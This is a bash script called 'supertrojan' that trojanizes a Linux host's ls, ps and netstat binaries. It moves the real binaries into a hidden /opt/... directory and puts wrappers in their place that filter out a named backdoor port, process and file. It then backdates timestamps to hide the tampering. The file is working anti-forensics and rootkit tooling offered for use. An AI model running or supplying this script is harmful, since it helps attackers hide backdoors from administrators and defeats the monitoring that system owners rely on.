#! /bin/bash
##supertrojan script from /bin
#usage: supertrojan <netstat> <ps> <ls> <yyyymmddhhmm>
#example: Imagine you have a backdoor on a computer. the backdoor displays in the file list as "Malware.file", in the process list as "malware.process", and can be seen in the netstat on port 1337.
#you would run this command: 
  ##supertrojan 1337 malware.process malware.file 202001010000
##this will filter 1337 out of netstat, malware.process out of ps, and malware.file from ls
##timestamp in format of yyyymmddhhmm

##this script does a few things
##first it moves ps, ls, and netstat to /opt
##then it makes scripts replacing ps,ls,and netstat. these scripts call the real binaries, but grep -v out whatever argument is passed to supertrojan.
##finally, it makes said binaries executable. with Chmod and timestampts them to the provided timestamp to assist in obfuscation

#! /bin/bash

##test to make sure /bin/ls exists
lsdir=$(which ls)
if [ $lsdir = /bin/ls ]
        then
                sleep 1
        else
                echo "binaries are not in /bin. the ls binary is located at $lsdir . use notepad++ to replace all instances of /bin/ls with $lsdir, and the same for netstat and ps"
                supertrojan will now exit with having done nothing
                exit 1
        fi

##test to make sure trojan has not been ran
if test -e /opt/.../lsr
then
        echo "trojan already ran! run these commands to untrojan
        mv /opt/.../nsr /bin/netstat
        mv /opt/.../psr /bin/ps
        mv /opt/.../lsr  /bin/ls
supertrojan will now exit with having done nothing.
        "
        exit 1
fi

##test to make sure trojan has arguments. If it does not, print the usage statement
#! /bin/bash
if [ $# -eq 4 ]
        then
                echo "arguments good"
        else
                echo "
                usage: supertrojan <netstat> <ps> <ls> <yyyymmddhhmm>
                <netstat> is the string you want to hide in netstat
                ditto for ps and ls
                yyyymmddhhmm is the timestamp to use for backdating bins
                example: supertrojan 1337 malware.process malware.file 202001010000
                "
                exit 1
        fi

##make /opt/... dir
mkdir /opt/...
touch -t $4 /opt
touch -t $4 /opt/...

##trojanize netstat
mv /bin/netstat /opt/.../nsr;
echo "hiding $1 from netstat";
echo "
#! /bin/bash
/opt/.../nsr \$1 \$2 \$3 \$4 \$5 \$6 | grep -v $1;
" > /bin/netstat;
chmod 777 /bin/netstat;
touch -t $4 /bin/netstat
touch -t $4 /opt/.../nsr

##trojanize ps
mv /bin/ps /opt/.../psr;
echo "hiding $2 from ps";
echo "
#! /bin/bash
/opt/.../psr \$1 \$2 \$3 \$4 \$5 \$6 \$7 | grep -v $2;
" > /bin/ps;
chmod 777 /bin/ps;
touch -t $4 /bin/ps
touch -t $4 /opt/.../psr

##trojanize ls.
mv /bin/ls /opt/.../lsr;
echo "hiding $3 from ls";
echo "
#! /bin/bash
/opt/.../lsr \$1 \$2 \$3 \$4 \$5 \$6 \$7 | grep -v $3;
" > /bin/ls;
chmod 777 /bin/ls;
touch -t $4 /bin/ls
touch -t $4 /opt/.../lsr
